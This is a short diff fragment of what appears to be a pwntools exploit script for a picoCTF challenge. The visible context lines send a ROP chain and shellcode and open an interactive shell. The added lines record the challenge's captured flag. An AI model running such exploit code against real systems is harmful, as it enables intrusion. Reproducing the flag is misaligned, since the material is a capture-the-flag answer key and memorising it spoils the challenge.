@@ -139,3 +139,7 @@ r.send(chain)
 r.sendline(shellcode)
 
 r.interactive()
+
+# flag: picoCTF{n0_sh3ll_v3ry_flag_xdd}
+
+
